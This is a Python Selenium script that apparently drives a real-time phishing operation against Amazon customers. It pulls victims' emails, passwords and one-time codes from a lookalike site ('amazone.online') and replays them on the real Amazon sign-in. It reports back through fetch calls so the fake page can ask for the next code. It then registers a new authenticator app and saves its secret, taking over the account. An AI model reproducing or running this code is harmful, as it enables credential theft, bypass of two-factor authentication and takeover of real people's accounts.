import time
import os
import random
import datetime
import logging
import zipfile
import pickle
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.alert import Alert
import a_db
import json
sessin_data_log = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H-%M-%S")
logging.basicConfig(level=logging.INFO,
                    format='(%(module)s) %(message)s',
                    handlers=[logging.FileHandler(f"session_{sessin_data_log}.log", 'a', 'utf-8')])
logger = logging.getLogger("Log")
url_fake_site = "https://amazone.online"


class Abrowser(object):
    def __init__(self, id_thr: int, type_script: str,
                 script_path: str, account_path: str,
                 user_id: int, user_login: str, user_id_db: int):
        try:
            a_db.session_now_plus()
            self.id_thr = id_thr
            self.type_script = type_script
            self.script_path = script_path
            self.account_path = account_path
            self.user_id = user_id
            self.user_id_db = user_id_db
            self.user_login = user_login
            self.chrome_options = Options()
            self.chrome_options.add_argument("--lang=en")
            self.chrome_options.add_argument("--mute-audio")
            self.chrome_options.add_argument(
                f"--user-data-dir={self.account_path}")
            d = DesiredCapabilities.CHROME
            d['goog:loggingPrefs'] = { 'browser':'INFO' }
            self.driver = webdriver.Chrome(options=self.chrome_options, desired_capabilities=d)
            self.driver.set_page_load_timeout(60)
            self.print(f"Start work browsing")
            pass
        except Exception as ex:
            self.print(ex)
            self.quit()
            return

    def print(self, *msg):
        full_msg = str()
        full_msg += f"({str(self.id_thr)}) "
        full_msg += f"({datetime.datetime.utcnow().strftime('%H:%M:%S')}) "
        if hasattr(self, 'user_login'):
             full_msg += f"({self.user_login}) "
        # if hasattr(self, 'proxy'):
        #     full_msg += f"({self.proxy}) "
        full_msg += "=> "
        full_msg += " | ".join(str(x) for x in msg)
        logger.info(full_msg)
        # print(full_msg)

    def quit(self):
        self.print(f"Quit work {self.user_id_db}")
        if self.user_id_db != 0:
            a_db.acc_stop_work(self.user_id_db)
        if hasattr(self, 'driver'):
            self.driver.quit()
        a_db.session_now_minus()
        
        return

    def is_end_work(self):
        return a_db.is_end_work(self.user_id_db) 

    def searcher(self):
        try:
            self.driver.set_script_timeout(1)
            while self.is_end_work() is False:
                self.get_new_users()
                execute_codes = a_db.get_execute_codes()
                if execute_codes is not None:
                    self.print(f"Find {len(execute_codes)} execute_codes")
                    for execute_code in execute_codes:
                        code = execute_code["code"]
                        code_id = execute_code["id"]
                        try:
                            self.driver.execute_async_script(code)
                        except:
                            pass
                        self.print(f"Execute id {code_id}, code is : {code}")
                        a_db.set_executed(code_id)

                accs_who_need = a_db.accs_who_need()
                if accs_who_need is not None:
                    for acc in accs_who_need:
                        if acc["status"] == "Need password":
                            self.get_acc_password(int(acc["user_id"]), int(acc["id_db"]))
                            pass
                        elif acc["status"] == "Need chose phone or email":
                            self.get_acc_chose_phone_or_email(int(acc["user_id"]), int(acc["id_db"]))
                            pass
                        elif acc["status"] == "Need otp code":
                            self.get_acc_get_otp_code(int(acc["user_id"]), int(acc["id_db"]))
                            pass
                        elif acc["status"] == "Need zip code":
                            pass
                        elif acc["status"] == "Need email code":
                            self.get_acc_get_otp_code(int(acc["user_id"]), int(acc["id_db"]))
                            pass
                        elif acc["status"] == "Need phone code":
                            self.get_acc_get_otp_code(int(acc["user_id"]), int(acc["id_db"]))
                            pass
                time.sleep(1)
            self.quit()
        except Exception as ex:
            self.print(ex)
            self.quit()
            return


    def get_acc_password(self, user_id: int, id_db: int):
        try:
            # self.print("Need password")
            # self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20authentication")
            self.driver.get(f"{url_fake_site}/api/v1/user_sessions")
            el = WebDriverWait(self.driver, 1).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
            json_el = json.loads(el.text[8:-1])
            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
            for d in newlist:
                acc_id = d["id"]
                if int(acc_id) == user_id:
                    # self.print(f"{int(acc_id)} === {user_id}")
                    acc_datetime = d["updated_at"]
                    acc_datetime = acc_datetime[:-5]
                    acc_datetime = datetime.datetime.strptime(acc_datetime, '%Y-%m-%dT%H:%M:%S')
                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime} after change")
                    datetime_now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
                    datetime_now = datetime.datetime.strptime(datetime_now, '%Y-%m-%dT%H:%M:%S')
                    diff_datetime = datetime_now - acc_datetime
                    # self.print(f"Acc with id {acc_id} and datetime {acc_datetime}: different from now is {diff_datetime.seconds} seconds")
                    if (diff_datetime.seconds / 60) > 5:
                        #self.print(f"Acc with id {acc_id} and datetime {acc_datetime}: different MORE than 3 minutes")
                        a_db.acc_change_status(id_db, "5 min waited")
                        a_db.acc_stop_work(id_db)
                        self.print(f"Acc id_db {id_db} with id {acc_id} end work by 5 min waited")
                        break
                    acc_password = d["password"]
                    # self.print(f"Acc id_db {id_db} with id {acc_id} have password {acc_password}")
                    if acc_password is not None:
                        a_db.acc_set_password(id_db, acc_password)
                        self.print(f"Set password {acc_password} to acc id_db {id_db}")
                    break
                else:
                    self.print(f"{int(acc_id)} != {user_id}")
                    continue  
            pass
        except Exception as ex:
            self.print(ex)
            self.quit()
            return

    def get_acc_chose_phone_or_email(self, user_id: int, id_db: int):
        try:
            # self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=authenticated")
            self.driver.get(f"{url_fake_site}/api/v1/user_sessions")
            el = WebDriverWait(self.driver, 1).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
            json_el = json.loads(el.text[8:-1])
            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
            for d in newlist:
                acc_id = d["id"]
                if int(acc_id) == user_id:
                    acc_datetime = d["updated_at"]
                    acc_datetime = acc_datetime[:-5]
                    acc_datetime = datetime.datetime.strptime(acc_datetime, '%Y-%m-%dT%H:%M:%S')
                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime} after change")
                    datetime_now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
                    datetime_now = datetime.datetime.strptime(datetime_now, '%Y-%m-%dT%H:%M:%S')
                    diff_datetime = datetime_now - acc_datetime
                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different from now is {diff_datetime.seconds} seconds")
                    if (diff_datetime.seconds / 60) > 5:
                        # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different MORE than 3 minutes")
                        a_db.acc_change_status(id_db, "5 min waited")
                        a_db.acc_stop_work(id_db)
                        self.print(f"Acc id_db {id_db} with id {acc_id} end work by 5 min waited")
                        break
                    acc_verification_type = d["verification_type"]
                    if acc_verification_type is not None:
                        if "email/phone" in acc_verification_type:
                            pass
                        elif "email" in acc_verification_type:
                            a_db.acc_change_status(id_db, "Selected email")
                            pass
                        elif "phone" in acc_verification_type:
                            a_db.acc_change_status(id_db, "Selected phone")
                            pass
                    break
                else:
                    # self.print(f"{int(acc_id)} != {user_id}")
                    continue 
            pass
        except Exception as ex:
            self.print(ex)
            self.quit()
            return

    def get_acc_get_otp_code(self, user_id: int, id_db: int):
        try:
            # self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20verification")
            self.driver.get(f"{url_fake_site}/api/v1/user_sessions")
            el = WebDriverWait(self.driver, 1).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
            json_el = json.loads(el.text[8:-1])
            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
            for d in newlist:
                acc_id = d["id"]
                if int(acc_id) == user_id:
                    acc_datetime = d["updated_at"]
                    acc_datetime = acc_datetime[:-5]
                    acc_datetime = datetime.datetime.strptime(acc_datetime, '%Y-%m-%dT%H:%M:%S')
                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime} after change")
                    datetime_now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
                    datetime_now = datetime.datetime.strptime(datetime_now, '%Y-%m-%dT%H:%M:%S')
                    diff_datetime = datetime_now - acc_datetime
                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different from now is {diff_datetime.seconds} seconds")
                    if (diff_datetime.seconds / 60) > 5:
                        # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different MORE than 3 minutes")
                        a_db.acc_change_status(id_db, "5 min waited")
                        a_db.acc_stop_work(id_db)
                        self.print(f"Acc id_db {id_db} with id {acc_id} end work by 5 min waited")
                        break
                    acc_verification_code = d["verification_code"]
                    if acc_verification_code is not None:
                        a_db.acc_set_code_otp(id_db, str(acc_verification_code))
                    break
                else:
                    # self.print(f"{int(acc_id)} != {user_id}")
                    continue 
            pass
        except Exception as ex:
            self.print(ex)
            self.quit()
            return
            
    def get_new_users(self):
        try:
            self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20email%20check")
            el = WebDriverWait(self.driver, 1).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
            json_el = json.loads(el.text[8:-1])
            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
            # self.print(newlist)
            # lines = []
            # lines = sorted(lines, key=lambda k: k['id'], reverse=True)
            new_accs = []
            for d in newlist:
                acc_id = d["id"]
                acc_login = d["login"]
                acc_datetime = d["created_at"]
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}")
                acc_datetime = acc_datetime[:-5]
                acc_datetime = datetime.datetime.strptime(acc_datetime, '%Y-%m-%dT%H:%M:%S')
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime} after change")
                datetime_now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
                datetime_now = datetime.datetime.strptime(datetime_now, '%Y-%m-%dT%H:%M:%S')
                diff_datetime = datetime_now - acc_datetime
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different from now is {diff_datetime.seconds} seconds")
                if (diff_datetime.seconds / 60) > 3:
                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different MORE than 3 minutes")
                    break
                # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different LESS than 3 minutes, go to ADD to db")
                new_accs.append({
                    "id" : acc_id,
                    "login" : f"{acc_login}"
                })
            self.print(f"We find {len(new_accs)} new accs")
            if len(new_accs) > 0:
                return a_db.get_new_session(new_accs)
            else:
                return None
        except Exception as ex:
            self.print(ex)
            self.quit()
            return

    def user(self):
        try:
            if self.is_end_work() is True:
                self.quit()
                return
            self.driver.get(f"https://www.amazon.com/")
            self.print("I get Amazon!!!")
            try:
                el_nav_ya_signin = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@data-nav-ref = 'nav_ya_signin']")))
            except Exception as ex:
                raise Exception("Not find el_nav_ya_signin")

            sign_in_link = el_nav_ya_signin.get_attribute("href")
            self.driver.get(sign_in_link)

            self.print(f"After click on el_nav_ya_signin {self.driver.current_url}")

            try:
                el_input_email = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
            except Exception as ex:
                raise Exception("Not find el_input_email")

            try:
                el_input_submit= WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
            except Exception as ex:
                raise Exception("Not find el_input_submit")

            self.driver.execute_script(f"arguments[0].setAttribute('value','{self.user_login}')", el_input_email)
            actions = ActionChains(self.driver)
            actions.move_to_element(el_input_submit)
            actions.move_by_offset(-3, -2)
            actions.pause(random.randint(1, 2))
            actions.click()
            actions.perform()
            self.print(f"After click on el_input_submit email {self.driver.current_url}")

            time.sleep(1)
            is_exept = False
            try:
                el_input_email = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
            except Exception as ex:
                self.print(ex)
                is_exept = True
                pass

            if is_exept is True:
                url_to_email_check_error = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/email_check_error"
                script_data = f"fetch('{url_to_email_check_error}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ error_message: 'We cannot find an account with that email address }) })"
                a_db.add_executed_code(script_data)
                raise Exception("Bad email")

            url_to_email_check_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/email_check_success"
            script_data = f"fetch('{url_to_email_check_success}',"+" {method: 'PATCH'}"+").then((response) => response.json()).then((data) => " + "{ console.log(data)})"
            a_db.add_executed_code(script_data)
            a_db.acc_change_status(self.user_id_db, "Need password")
            first_try_password = True
            while True:
                if self.is_end_work() is True:
                    self.quit()
                    return
                # self.print(f"a_db.acc_get_password({self.user_id_db})")
                password = a_db.acc_get_password(self.user_id_db)
                if password is None:
                    time.sleep(1)
                    continue

                self.password = password
                
                if first_try_password == True:
                    try:
                        el_rememberMe = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberMe']")))
                    except Exception as ex:
                        raise Exception("el_rememberMe")
                    el_rememberMe.click()
                    first_try_password = False

                try:
                    el_password = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
                except Exception as ex:
                    raise Exception("el_password")
                self.driver.execute_script(f"arguments[0].setAttribute('value','{self.password}')", el_password)

                try:
                    el_signInSubmit = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                except Exception as ex:
                    raise Exception("el_signInSubmit")

                el_signInSubmit.click()
                time.sleep(3)
                self.print(f"After click on el_signInSubmit password {self.driver.current_url}")
                is_exept = False
                try:
                    el_password = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
                except Exception as ex:
                    is_exept = True
                    self.print(ex)
                
                if is_exept is False:
                    url_to_email_auth_error = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_error"
                    script_data = f"fetch('{url_to_email_auth_error}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ error_message: 'Your password is incorrect }) })"
                    a_db.acc_set_password(self.user_id_db, "None")
                    a_db.add_executed_code(script_data)
                    a_db.acc_change_status(self.user_id_db, "Need password")
                    self.print(f"Bad password {self.password}")
                    continue
                break
            
            if "Authentication required" in self.driver.page_source:
                self.print("Authentication required")
                is_chosed = False
                if "We will email you a One Time Password" in self.driver.page_source:
                    self.print("We will email you a One Time Password")
                    try:
                        el_submit_send_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                    except Exception as ex:
                        raise Exception("el_submit_send_code")
                    el_submit_send_code.click()

                    time.sleep(1)
                if "We will send you a One Time Password" in self.driver.page_source or "How would you like" in self.driver.page_source or "Where should we send the communication?" in self.driver.page_source:
                    self.print("We will send you a One Time Password | or | How would you like")
                    url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
                    script_data = f"fetch('{url_to_auth_success}'," + "{method: 'PATCH',headers: { 'Content-Type': 'application/json'}, body: JSON.stringify({ verification_type: 'email/phone'})})"
                    a_db.add_executed_code(script_data)
                    a_db.acc_change_status(self.user_id_db, "Need chose phone or email")
                    # Selected phone, Selected email
                    while True:
                        if self.is_end_work() is True:
                            self.quit()
                            return
                        
                        status = a_db.acc_get_status(self.user_id_db)

                        if "Selected phone" in status:
                            try:
                                el_chose_phone = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@value = 'sms']")))
                            except Exception as ex:
                                raise Exception("el_chose_phone")
                            el_chose_phone.click()
                            time.sleep(1)
                            try:
                                el_submit_send_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                            except Exception as ex:
                                raise Exception("el_submit_send_code")
                            el_submit_send_code.click()

                            time.sleep(1)
                            # html_source = "One Time Password (OTP) sent to +"
                            is_chosed = True
                            break
                        elif "Selected email" in status:
                            try:
                                el_chose_email = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@value = 'email']")))
                            except Exception as ex:
                                raise Exception("el_chose_email")
                            el_chose_email.click()
                            time.sleep(1)
                            try:
                                el_submit_send_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                            except Exception as ex:
                                raise Exception("el_submit_send_code")
                            el_submit_send_code.click()

                            time.sleep(1)
                            # html_source = "One Time Password (OTP) sent to "
                            is_chosed = True
                            break
                        else:
                            time.sleep(1)
                            continue
                    pass
                if "One Time Password (OTP) sent to +" in self.driver.page_source:
                    self.print("One Time Password (OTP) sent to +")
                    if is_chosed is False:
                        url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
                        script_data = f"fetch('{url_to_auth_success}'," + "{method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ verification_type: 'phone' }) })"
                        a_db.add_executed_code(script_data)
                    a_db.acc_change_status(self.user_id_db, "Need phone code")
                    while True:
                        if self.is_end_work() is True:
                            self.quit()
                            return
                        
                        code_otp = a_db.acc_get_code_otp(self.user_id_db)
                        if code_otp is None:
                            time.sleep(1)
                            continue

                        try:
                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'code']")))
                        except Exception as ex:
                            raise Exception("el_input_code")
                        self.driver.execute_script(f"arguments[0].setAttribute('value','{code_otp}')", el_input_code)
                        time.sleep(1)
                        try:
                            el_submit_enter_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                        except Exception as ex:
                            raise Exception("el_submit_enter_code")
                        el_submit_enter_code.click()
                        time.sleep(1)
                        try:
                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'code']")))
                            raise Exception("Find el_input_code")
                        except Exception as ex:
                            pass
                        url_to_verification_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/verification_success"
                        script_data = f"fetch('{url_to_verification_success}'," + "{ method: 'PATCH' })"
                        a_db.add_executed_code(script_data)
                        a_db.acc_change_status(self.user_id_db, "verification_success")
                        break
                    pass
                elif "One Time Password (OTP) sent to " in self.driver.page_source:
                    self.print("One Time Password (OTP) sent to ")
                    if is_chosed is False:
                        url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
                        script_data = f"fetch('{url_to_auth_success}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ verification_type: 'email' }) })"
                        a_db.add_executed_code(script_data)
                    a_db.acc_change_status(self.user_id_db, "Need email code")
                    while True:
                        if self.is_end_work() is True:
                            self.quit()
                            return
                        
                        code_otp = a_db.acc_get_code_otp(self.user_id_db)
                        if code_otp is None:
                            time.sleep(1)
                            continue

                        try:
                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'code']")))
                        except Exception as ex:
                            raise Exception("el_input_code")
                        self.driver.execute_script(f"arguments[0].setAttribute('value','{code_otp}')", el_input_code)
                        time.sleep(1)
                        try:
                            el_submit_enter_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                        except Exception as ex:
                            raise Exception("el_submit_enter_code")
                        el_submit_enter_code.click()
                        time.sleep(1)
                        try:
                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'code']")))
                            raise Exception("Find el_input_code")
                        except Exception as ex:
                            pass
                        url_to_verification_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/verification_success"
                        script_data = f"fetch('{url_to_verification_success}'," + "{ method: 'PATCH' })"
                        a_db.add_executed_code(script_data)
                        a_db.acc_change_status(self.user_id_db, "verification_success")
                        break
                    pass
                else:
                    raise Exception("Cant detect  Authentication required")
            elif "Two-Step Verification" in self.driver.page_source:
                self.print("Two-Step Verification")
                if "sent to a phone number" in self.driver.page_source:
                    # input name="rememberDevice"
                    # input name="otpCode"
                    # input name="mfaSubmit"
                    self.print("sent to a phone number")
                    url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
                    script_data = f"fetch('{url_to_auth_success}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ verification_type: 'phone' }) })"
                    a_db.add_executed_code(script_data)
                    a_db.acc_change_status(self.user_id_db, "Need phone code")
                    while True:
                        if self.is_end_work() is True:
                            self.quit()
                            return
                        
                        code_otp = a_db.acc_get_code_otp(self.user_id_db)
                        if code_otp is None:
                            time.sleep(1)
                            continue
                        
                        try:
                            el_input_rememberDevice = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberDevice']")))
                        except Exception as ex:
                            raise Exception("el_input_rememberDevice")
                        el_input_rememberDevice.click()
                        time.sleep(1)
                        
                        try:
                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'otpCode']")))
                        except Exception as ex:
                            raise Exception("el_input_code")
                        self.driver.execute_script(f"arguments[0].setAttribute('value','{code_otp}')", el_input_code)
                        time.sleep(1)
                        try:
                            el_submit_enter_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                        except Exception as ex:
                            raise Exception("el_submit_enter_code")
                        el_submit_enter_code.click()
                        time.sleep(1)
                        try:
                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'otpCode']")))
                            raise Exception("Find el_input_code")
                        except Exception as ex:
                            pass
                        url_to_verification_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/verification_success"
                        script_data = f"fetch('{url_to_verification_success}'," + "{ method: 'PATCH' })"
                        a_db.add_executed_code(script_data)
                        a_db.acc_change_status(self.user_id_db, "verification_success")
                        break
                    pass
                elif "generated by your Authenticator App" in self.driver.page_source:
                    self.print("generated by your Authenticator App")
                    url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
                    script_data = f"fetch('{url_to_auth_success}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ verification_type: 'otp' }) })"
                    a_db.add_executed_code(script_data)
                    a_db.acc_change_status(self.user_id_db, "Need otp code")
                    while True:
                        if self.is_end_work() is True:
                            self.quit()
                            return
                        
                        code_otp = a_db.acc_get_code_otp(self.user_id_db)
                        if code_otp is None:
                            time.sleep(1)
                            continue
                        
                        try:
                            el_input_rememberDevice = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberDevice']")))
                        except Exception as ex:
                            raise Exception("el_input_rememberDevice")
                        el_input_rememberDevice.click()
                        time.sleep(1)
                        
                        try:
                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'otpCode']")))
                        except Exception as ex:
                            raise Exception("el_input_code")
                        self.driver.execute_script(f"arguments[0].setAttribute('value','{code_otp}')", el_input_code)
                        time.sleep(1)
                        try:
                            el_submit_enter_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                        except Exception as ex:
                            raise Exception("el_submit_enter_code")
                        el_submit_enter_code.click()
                        time.sleep(1)
                        try:
                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'otpCode']")))
                            raise Exception("Find el_input_code")
                        except Exception as ex:
                            pass
                        url_to_verification_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/verification_success"
                        script_data = f"fetch('{url_to_verification_success}'," + "{ method: 'PATCH' })"
                        a_db.add_executed_code(script_data)
                        a_db.acc_change_status(self.user_id_db, "verification_success")
                        break
                    pass
                else:
                    raise Exception("Cant detect Two-Step Verification")
            else:
                raise Exception("NOT Authentication required and NOT Two-Step Verification")
            
            time.sleep(3)
            # try:
            #     el_a_nav_a= WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@class = 'nav_a']")))
            # except Exception as ex:
            #     raise Exception("el_a_nav_a")
            
            # self.print("el_a_nav_a.click()")
            # el_a_nav_a.click()
            # time.sleep(3)
            self.driver.get("https://www.amazon.com/gp/css/homepage.html?ie=UTF8&ref_=footer_ya")
            try:
                el_SignInAndSecurity = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//div[@data-card-identifier = 'SignInAndSecurity']")))
            except Exception as ex:
                raise Exception("el_SignInAndSecurity")
            
            self.print("el_SignInAndSecurity.click()")
            el_SignInAndSecurity.click()
            # actions = ActionChains(self.driver)
            # actions.move_to_element(el_SignInAndSecurity)
            # actions.pause(random.randint(1, 2))
            # actions.click()
            # actions.perform()

            time.sleep(3)
            try:
                el_input_edit = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@id = 'auth-cnep-advanced-security-settings-button']")))
            except Exception as ex:
                raise Exception("el_input_edit")
            
            self.print("el_input_edit.click()")
            el_input_edit.click()

            time.sleep(3)
            if "Add new app" in self.driver.page_source:
                self.print("Add new app")
                
                try:
                    el_a_add_new = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@id = 'ch-settings-totp-primary-add-link']")))
                except Exception as ex:
                    raise Exception("el_a_add_new")

                self.print("el_a_add_new.click()")
                el_a_add_new.click()
                time.sleep(3)
            elif "Get Started" in self.driver.page_source:
                self.print("Get Started")
                try:
                    el_a_get_started = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@id = 'sia-settings-enable-mfa']")))
                except Exception as ex:
                    raise Exception("el_a_get_started")

                self.print("el_a_get_started.click()")
                el_a_get_started.click()
                time.sleep(3)

            else:
                raise Exception("Cant finde Get Started or Add new app in page")

            if "Text message (SMS)" in self.driver.page_source:
                self.print("Text message (SMS)")
                try:
                    # <a id="sia-otp-accordion-totp-header" data-action="a-accordion" class="a-accordion-row a-declarative" href="#" aria-label=""><i class="a-icon a-accordion-radio a-icon-radio-inactive"></i><h5><span class="a-size-medium a-text-bold">Authenticator App</span><span class="a-letter-space"></span><span class="a-color-tertiary">Generate OTP using an application. No network connectivity required.</span></h5></a>
                    el_a_authenticator_app= WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@id = 'sia-otp-accordion-totp-header']")))
                except Exception as ex:
                    raise Exception("el_a_authenticator_app")
                
                self.print("el_a_authenticator_app.click()")
                el_a_authenticator_app.click()
                time.sleep(3)
                pass
            
            try:
                el_span_code_app= WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//span[@id = 'sia-auth-app-formatted-secret']")))
            except Exception as ex:
                raise Exception("el_span_code_app")
            
            secret_code = el_span_code_app.get_attribute("innerHTML")
            self.print(f"Code app is {secret_code}")
            a_db.acc_set_code_app(self.user_id_db, secret_code)

            # save main_window
            main_window = self.driver.current_window_handle

            # open new blank tab
            self.driver.execute_script("window.open();")

            # switch to the new window which is second in window_handles array
            self.driver.switch_to_window(self.driver.window_handles[1])

            # open successfully and close
            self.driver.get("https://gauth.apps.gbraad.nl/")


            #a id="edit"
            try:
                el_a_edit= WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@id = 'edit']")))
            except Exception as ex:
                raise Exception("el_a_edit")
            
            self.print("el_a_edit.click()")
            el_a_edit.click()
            time.sleep(3)

            #<a class="ui-btn-icon-notext ui-icon-delete" href="#"></a>
            try:
                el_a_delete = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@class = 'ui-btn-icon-notext ui-icon-delete']")))
            except Exception as ex:
                raise Exception("el_a_delete")
            
            self.print("el_a_delete.click()")
            el_a_delete.click()
            time.sleep(3)

            try:
                el_a_addButton= WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@id = 'addButton']")))
            except Exception as ex:
                raise Exception("el_a_addButton")
            
            self.print("el_a_addButton.click()")
            el_a_addButton.click()
            time.sleep(3)

            try:
                el_input_keyAccount= WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@id = 'keyAccount']")))
            except Exception as ex:
                raise Exception("el_input_keyAccount")
            try:
                el_input_keySecret= WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@id = 'keySecret']")))
            except Exception as ex:
                raise Exception("el_input_keySecret")
            try:
                el_a_addKeyButton = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@id = 'addKeyButton']")))
            except Exception as ex:
                raise Exception("el_a_addKeyButton")
            
            self.print("Enter value el_input_keyAccount")
            self.driver.execute_script(f"arguments[0].setAttribute('value','{self.user_login}')", el_input_keyAccount)
            time.sleep(1)
            self.print("Enter value el_input_keySecret")
            self.driver.execute_script(f"arguments[0].setAttribute('value','{secret_code}')", el_input_keySecret)
            time.sleep(1)
            self.print("el_a_addKeyButton.click()")
            el_a_addKeyButton.click()
            time.sleep(3)

            try:
                el_h3 = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//ul[@data-role = 'listview']//h3")))
            except Exception as ex:
                raise Exception("el_h3")
            
            otp_code = el_h3.text
            self.print(f"Code otp from app is {otp_code}")

            self.driver.close()
            self.driver.switch_to_window(self.driver.window_handles[0])

